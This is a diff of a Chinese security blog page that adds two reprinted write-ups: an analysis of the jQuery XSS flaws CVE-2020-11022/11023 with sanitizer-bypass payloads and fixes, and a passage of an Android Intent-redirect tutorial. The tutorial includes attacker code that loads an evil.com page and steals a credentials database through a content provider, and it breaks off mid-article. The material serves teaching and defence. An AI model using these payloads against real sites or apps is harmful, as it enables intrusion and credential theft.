@@ -14,7 +14,7 @@
     <meta name="description" content="Open your eyes to see the light in life">
 <meta property="og:type" content="website">
 <meta property="og:title" content="氕氘氚">
-<meta property="og:url" content="http://example.com/archives/2024/page/3/index.html">
+<meta property="og:url" content="https://szczecin.github.io/archives/2024/page/3/index.html">
 <meta property="og:site_name" content="氕氘氚">
 <meta property="og:description" content="Open your eyes to see the light in life">
 <meta property="og:locale">
@@ -82,6 +82,255 @@
 
 
 <section class="post-list">
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/22/CVE-2020-11022:11023-jQuery/">
+                jQuery最新xss漏洞分析——CVE-2020-11022/11023
+            </a>
+        </h2>
+    
+    <time>
+        Jan 22, 2024
+    </time>
+    <section class="content">
+        <h1><span id="jquery最新xss漏洞分析cve-2020-11022x2f11023">jQuery最新xss漏洞分析——CVE-2020-11022&#x2F;11023</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1638163">Jayway</a> 并作补充</p>
+</blockquote>
+<h2><span id="背景">背景</span></h2><blockquote>
+<p>jQuery官方上周发布了最新版本3.5.0，主要修复了两个安全问题，官方博客为：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/</span><br></pre></td></tr></table></figure>
+
+<p>据NVD描述：在大于或等于1.2且在3.5.0之前的jQuery版本中，即使执行了消毒（sanitize）处理，也仍会执行将来自不受信任来源的HTML传递给jQuery的DOM操作方法（即html()、.append()等），从而导致xss漏洞。</p>
+<p><img src="/2024/01/22/CVE-2020-11022:11023-jQuery/1.png" alt="image"></p>
+</blockquote>
+<h2><span id="二-前置知识">二、前置知识</span></h2><blockquote>
+<p>在讲解漏洞之前，需要了解jQuery的基本用法和历史漏洞，具体可参考：jQuery框架漏洞全总结及开发建议：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/M1BYj6VbeoNV4C5M7cR_hA</span><br></pre></td></tr></table></figure>
+
+<p>而与此次jQuery漏洞联系比较紧密的是html()等方法，此方法返回或设置被选元素的内容 (inner HTML)，可用于设置所有选定元素的内容，看一个简单的使用案例：</p>
+<p><img src="/2024/01/22/CVE-2020-11022:11023-jQuery/2.png" alt="image"></p>
+<p>此处定义一个点击事件，会对所有的p元素进行匹配，并修改为相同的内容。</p>
+</blockquote>
+<h2><span id="三-漏洞复现">三、漏洞复现</span></h2><blockquote>
+<p>对于此漏洞原作者搭建了在线环境，内置了三个xss poc，点击Append via .html()按钮即可触发xss：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/22/CVE-2020-11022:11023-jQuery/3.png" alt="image"></p>
+<p>审查源码，逻辑很简单：</p>
+<p><img src="/2024/01/22/CVE-2020-11022:11023-jQuery/4.png" alt="image"></p>
+<p>首先使用如下代码模拟了一个开发场景，即将页面的所有div元素替换为根据ID取到的sanitizedHTML：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">n,jq</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">   sanitizedHTML = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;poc&#x27;</span>+n).<span class="property">innerHTML</span>;</span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">if</span>(jq)&#123;</span></span><br><span class="line"><span class="language-javascript">       $(<span class="string">&#x27;#div&#x27;</span>).<span class="title function_">html</span>(sanitizedHTML);</span></span><br><span class="line"><span class="language-javascript">   &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">       div.<span class="property">innerHTML</span>=sanitizedHTML;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>虽然三个poc都使用了包含onerror事件的img标签，但其实它们是放在属性或style元素内部，因此会绕过HTML清理器。</p>
+<p>以poc1为例，根据此id取到的值如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml"><span class="tag">&lt;<span class="name">style</span> /&gt;</span><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">xonerror</span>=<span class="string">alert(1)</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure>
+
+<p>点击之后，执行xss，此时审查div元素：</p>
+<p><img src="/2024/01/22/CVE-2020-11022:11023-jQuery/5.png" alt="image"></p>
+<p>发现我们提交的poc多了一个闭合标签，变成了:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml"><span class="tag">&lt;<span class="name">style</span> /&gt;</span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>&lt;imgsrc=x onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 闭合了<style>标签，成功执行后面的<img>脚本，导致xss。</p>
+</blockquote>
+<h2 id="四、漏洞原理"><a href="#四、漏洞原理" class="headerlink" title="四、漏洞原理"></a>四、漏洞原理</h2><h3 id="1、CVE-2020-11022"><a href="#1、CVE-2020-11022" class="headerlink" title="1、CVE-2020-11022"></a>1、CVE-2020-11022</h3><blockquote>
+<p>导致上述问题的关键是，在html()方法中，作为参数传递的HTML字符串将传递到  $ .htmlPrefilter（）方法：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://api.jquery.com/jQuery.htmlPrefilter/</span><br></pre></td></tr></table></figure>
+
+<p>这个方法用于替换自闭合标签，如将<tagname /> 替换为 <tagname ></tagname>，3.x版本之前使用的正则为：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rxhtmlTag =<span class="regexp">/&lt;(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:-]+)[^&gt;]*)\/&gt;/gi</span></span><br><span class="line">[...]</span><br><span class="line"><span class="attr">htmlPrefilter</span>: <span class="keyword">function</span>(<span class="params"> html </span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> html.<span class="title function_">replace</span>(rxhtmlTag, <span class="string">&quot;&lt;$1&gt;&lt;/$2&gt;&quot;</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>3.x之后使用的正则为：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rxhtmlTag =<span class="regexp">/&lt;(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0&gt;\x20\t\r\n\f]*)[^&gt;]*)\/&gt;/gi</span></span><br></pre></td></tr></table></figure>
+
+<p>这就使用到环境里的poc2（仅适用于jQuery3.x），注意这里的xss payload是作为属性出现，所以可以<strong>绕过消毒器规则</strong>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">alt</span>=<span class="string">&quot;&lt;x&quot;</span> <span class="attr">title</span>=<span class="string">&quot;/&gt;&lt;img src=xonerror=alert(1)&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>该poc使用html()方法执行后发现变为：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">alt</span>=<span class="string">&quot;&lt;x&quot;</span> <span class="attr">title</span>=<span class="string">&quot;/&gt;&lt;/x”&gt;&lt;imgsrc=x onerror=alert(1)&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>该正则会将x”识别为标签并新增&lt;&#x2F;x”&gt;闭合标签，从而达到xss的效果：</p>
+<p><img src="/2024/01/22/CVE-2020-11022:11023-jQuery/6.png" alt="image"></p>
+</blockquote>
+<h3 id="2、CVE-2020-11023"><a href="#2、CVE-2020-11023" class="headerlink" title="2、CVE-2020-11023"></a>2、CVE-2020-11023</h3><blockquote>
+<p>针对上述漏洞原理，jQuery Team进行了修复，修复手段为将$.htmlPrefilter()方法替换为标识函数，因此传递的HTML字符串现在不再经过htmlPrefilter函数处理，从而成功修复了漏洞。但仍有一些手段可以绕过，CVE-2020-11023就是针对CVE-2020-11022的绕过：</p>
+<p><img src="/2024/01/22/CVE-2020-11022:11023-jQuery/7.png" alt="image"></p>
+<p>绕过使用的是另一个特性，某些特殊的标签在经过html()方法处理时，会由于HTML的特性或浏览器的bug而使得这些标签被移除。</p>
+<p>option就是这些特殊标签之一，我们知道option 元素通过位于 select 元素内部来构造一个选择列表，但如果没有select元素，option会被移除。为了解决这个bug，如果传入参数的第一个元素为option，jQuery会新增&lt;select multiple&#x3D;’multiple’&gt;和</select>。</p>
+<p>所以我们提交poc3：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span>&lt;imgsrc=x onerror=alert(123456)&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>经过处理会变为：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">multiple</span>=<span class="string">&#x27;multiple&#x27;</span>&gt;</span><span class="tag">&lt;<span class="name">option</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span>&lt;imgsrc=x onerror=alert(123456)&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>根据HTML从前往后解析的顺序，会先解析一个<select>标签，且<select>不允许将大部分HTML标签包裹其中，导致<style>被忽略，而后识别<img>标签从而xss。</p>
+<p><img src="/2024/01/22/CVE-2020-11022:11023-jQuery/8.png" alt="image"></p>
+<p> 此漏洞在最新的3.5.0中也被修复，对于特殊的标签进行了处理。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/jquery/jquery/commit/966a70909019aa09632c87c0002c522fa4a1e30e#diff-51ec14165275b403bb33f28ce761cdedR25</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><h3 id="1、漏洞利用"><a href="#1、漏洞利用" class="headerlink" title="1、漏洞利用"></a>1、漏洞利用</h3><blockquote>
+<p>1）系统使用jQuery的html()、append()或$(‘<tag>‘)等方法处理用户输入；</p>
+<p>2）用户输入已经过“消毒”（sanitize）处理。</p>
+</blockquote>
+<h3 id="2、修复方案"><a href="#2、修复方案" class="headerlink" title="2、修复方案"></a>2、修复方案</h3><blockquote>
+<p>1）更新jQuery到3.5.0或更高版本</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://code.jquery.com/jquery-3.5.0.js</span><br></pre></td></tr></table></figure>
+
+<p>复制</p>
+<p>2）使用XSS清理工具清理用户输入的HTML，官方推荐：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/cure53/DOMPurify</span><br></pre></td></tr></table></figure>
+</blockquote>
+</style></p></blockquote>
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XSS/" rel="tag">XSS</a><a class="tag-none-link" href="/tags/jQuery/" rel="tag">jQuery</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/22/Android-Internet-Redirect/">
+                Android App安全之Intent重定向详解
+            </a>
+        </h2>
+    
+    <time>
+        Jan 22, 2024
+    </time>
+    <section class="content">
+        <h1><span id="android-app安全之intent重定向详解">Android App安全之Intent重定向详解</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/endpoint/271629.html">OPPO安珀实验室</a> 并作补充</p>
+</blockquote>
+<h2><span id="未导出组件和非导出组件">未导出组件和非导出组件</span></h2><h3><span id="导出组件公有组件">导出组件(公有组件)</span></h3><blockquote>
+<p>导出组件一般有以下三种形式：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.在AndroidManifest.xml中的组件如果显式设置了组件属性android:exported值为true;</span><br><span class="line"></span><br><span class="line">2.如果组件没有显式设置android:exported为false，但是其intent-filter以及action存在，则也为导出组件;</span><br><span class="line"></span><br><span class="line">3.API Level在17以下的所有App的provider组件的android:exported属性默认值为true，17及以上默认值为false。</span><br></pre></td></tr></table></figure>
+
+<p>任意第三方App都可以访问导出组件。</p>
+</blockquote>
+<h3><span id="未导出组件专用组件">未导出组件(专用组件)</span></h3><blockquote>
+<p>1.在AndroidManifest.xml中注册的组件显式设置android:exported&#x3D;”false” ;</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.WebViewActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>2.组件没有intent-filter, 且没有显式设置android:exported的属性值，默认为非导出的;</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.WebViewActivity&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>3.组件虽然配置了intent-filter,，但是显式设置android:exported&#x3D;”false”。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span> =<span class="string">&quot;.WebViewActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.VIEW&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">&quot;victim&quot;</span> <span class="attr">android:host</span>=<span class="string">&quot;secure_handler&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这三种组件称为专有组件或者未导出组件，三方应用无法直接调用这种组件。例如WebViewActivity中有以下代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">   <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">  <span class="comment">// ... </span></span><br><span class="line">   <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">   <span class="type">String</span> <span class="variable">Url</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">   <span class="comment">// ... </span></span><br><span class="line">   webView.loadUrl(Url);</span><br></pre></td></tr></table></figure>
+
+<p>第三方应用直接访问上述未导出的WebViewActivity组件来加载url，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.ui.WebViewActivity&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://evil.com/&quot;</span>);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
+
+<p>系统将会抛出java.lang.SecurityException, due to Permission Denial: WebViewActivity not exported from uid xxx.</p>
+</blockquote>
+<h2><span id="intent重定向">Intent重定向</span></h2><blockquote>
+<p>那么如果三方APP要想访问上述非导出的WebViewActivity是不是就没有办法了呢？</p>
+<p>当然不是! 其中一种常见的方式即为在本文中介绍Intent重定向， 即将Intent类的对象作为Intent 的Extras通过一个导出组件传递给非导出的组件, 以此来实现访问非导出的WebViewActivity组件。</p>
+<p>原理在于，Android 组件之间传输的Intent类是实现了Parcelable的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Intent</span> <span class="keyword">implements</span> <span class="title class_">Parcelable</span>, Cloneable &#123;</span><br></pre></td></tr></table></figure>
+
+<p>因此可以将属于Intent类的对象作为Intent的 extra数据对象传递到另一个组件中，相当于在Intent中嵌入Intent。</p>
+<p>这时，如果App从不可信 Intent 的Extras字段中提取出嵌入的 Intent，然后对这个嵌入 Intent 调用 startActivity（或类似的 startService 和 sendBroadcast），这样做是很危险的； 因为攻击者原本是无法访问非导出的组件的，但是通过intent重定向，即以导出的组件作为桥即可以访问非exported的组件，达到launch anywhere或者broadcast anywhere的目的。</p>
+<p>其原理如下图所示:</p>
+<p><img src="/2024/01/22/Android-Internet-Redirect/1.png" alt="image"></p>
+<p>Intent重定向违反了Android的安全设计，导致Android的安全访问限制（App的沙箱机制）失效。</p>
+<p>Intent重定向可能导致以下安全问题：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>启动非导出组件，通过精心构造的可控的Intent参数来执行敏感操作，如果可以重写或者替换native 库，甚至还会导致任意代码执行；</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>可以获取非导出的content provider组件的content：<span class="comment">// URI的访问权限来窃取敏感文件.</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来我们分别举三个例子来说明:</p>
+</blockquote>
+<h3><span id="启动非导出组件">启动非导出组件</span></h3><blockquote>
+<p>我们继续以上述的未导出的WebViewActivity为例子， 查找在App中是否存在导出Activity中包含了Intent重定向漏洞。刚好存在一个导出的com.victim.ui.HomeActivity组件符合预期。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onResume</span><span class="params">()</span> &#123; </span><br><span class="line">   <span class="comment">// ...  </span></span><br><span class="line">   handleIntentExtras(getIntent()); </span><br><span class="line">   <span class="comment">// 攻击者可以从外部输入任意intent</span></span><br><span class="line"> &#125;   </span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handleIntentExtras</span><span class="params">(Intent intent)</span> &#123; </span><br><span class="line">    <span class="comment">// ... </span></span><br><span class="line">    <span class="type">Intent</span> <span class="variable">deeplinkIntent</span> <span class="operator">=</span> (Intent)intent.getParcelableExtra(<span class="string">&quot;extra_deep_link_intent&quot;</span>); </span><br><span class="line">    <span class="comment">// ... </span></span><br><span class="line">    <span class="keyword">if</span> (!(deeplinkIntent == <span class="literal">null</span> || <span class="built_in">this</span>.consumedDeeplinkIntent)) &#123; </span><br><span class="line">    / / ... </span><br><span class="line">        startActivity(deeplinkIntent); <span class="comment">// 危险! 打开攻击者发送的Intent</span></span><br><span class="line">     <span class="comment">// ... </span></span><br><span class="line">  &#125; </span><br><span class="line"> <span class="comment">// ... </span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者可以实现通过这个导出的HomeActivity访问任何受保护的未导出的Activity; 我们可以编写一个攻击App，将发向HomeActivity的Intent重定向到未导出的组件WebViewActivity中，让WebViewActivity的WebView加载攻击者的恶意链接，从而达到绕过Android的权限限制的目的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">next</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(); </span><br><span class="line">next.setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.ui.WebViewActivity&quot;</span>); </span><br><span class="line">next.putExtra(<span class="string">&quot;extra_url&quot;</span>, <span class="string">&quot;http://evail.com&quot;</span>); <span class="comment">// 加载攻击者的钓鱼网站</span></span><br><span class="line">next.putExtra(<span class="string">&quot;extra_title&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(); </span><br><span class="line">intent .setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.ui.HomeActivity&quot;</span>); intent .putExtra(<span class="string">&quot;extra_deep_link_intent&quot;</span>, next); <span class="comment">// 嵌入Intent</span></span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="越权访问content-provider">越权访问content provider</span></h3><blockquote>
+<p>除了可以访问任意组件之外，攻击者还可以访问满足以下条件的APP的Content Provider的组件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.该组件必须是非导出的（否则可以直接攻击，无需使用我们在本文中讨论的模型）</span><br><span class="line"></span><br><span class="line">2.组件还设置了android：grantUriPermissions为true。</span><br></pre></td></tr></table></figure>
+
+<p>同时，攻击者在实现攻击时，必须将自己设置为嵌入Intent的接收者，并设置以下标志：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1).Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION允许对提供者的持久访问（没有此标志，则访问仅为一次）</span><br><span class="line"></span><br><span class="line">2).Intent.FLAG_GRANT_PREFIX_URI_PERMISSION允许通过前缀进行URI访问。</span><br><span class="line"></span><br><span class="line">3).Intent.FLAG_GRANT_READ_URI_PERMISSION允许对提供程序进行读取操作（例如query，openFile，openAssetFile）</span><br><span class="line"></span><br><span class="line">4).Intent.FLAG_GRANT_WRITE_URI_PERMISSION允许写操作</span><br></pre></td></tr></table></figure>
+
+<p>比如在App中有一个非导出的file provider, 该provider在其私有目录的database路径下保存了secret.db文件，该文件中保存了用户的登录账号信息。</p>
+<p>该file provider的设置如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.core.content.FileProvider&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:authorities</span>=<span class="string">&quot;com.android.victim&quot;</span> <span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;android.support.FILE_PROVIDER_PATHS&quot;</span> <span class="attr">android:resource</span>=<span class="string">&quot;@xml/provider_paths&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>为了简便起见，APP的资源文件res&#x2F;xml&#x2F;provider_paths文件的配置为</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">paths</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root-path</span> <span class="attr">name</span>=<span class="string">&quot;root&quot;</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">paths</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们无法直接访问file provider， 但是可以通过Intent重定向来窃取secret.db文件。</p>
+<p>payload如下:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Intent next= <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">next.setClassName(getPackageName(), <span class="string">&quot;com.Attacker.AttackerActivity&quot;</span>); </span><br><span class="line"><span class="comment">// 设置为攻击者自己的组件</span></span><br><span class="line">next.setData(Uri.parse(<span class="string">&quot;content://com.victim.localfile/secret.db&quot;</span>)); </span><br><span class="line">next.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION |   Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION  | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION); </span><br><span class="line"><span class="comment">// 添加所有可以访问content provider的读写flag</span></span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.victim.localfile&quot;</span>, <span class="string">&quot;com.victim.localfile.LoginActivity&quot;</span>); intent.putExtra(<span class="string">&quot;com.victim.extra.NEXT_INTENT&quot;</span>, next); </span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="通过webview访问任意组件">通过WebView访问任意组件</span></h3><blockquote>
+<p>通常我们可以通过调用Intent.toUri（flags）方法将Intent对象转换为字符串，同时可以使用Intent.parseUri（stringUri，flags）将字符串从字符串转换回Intent。此功能通常在WebView（APP内置浏览器）中使用。APP可以解析intent:&#x2F;&#x2F; 这种类型的scheme，将URL字符串解析为Intent对象并启动相关的Activity。</p>
+<p>漏洞代码示例:</p>
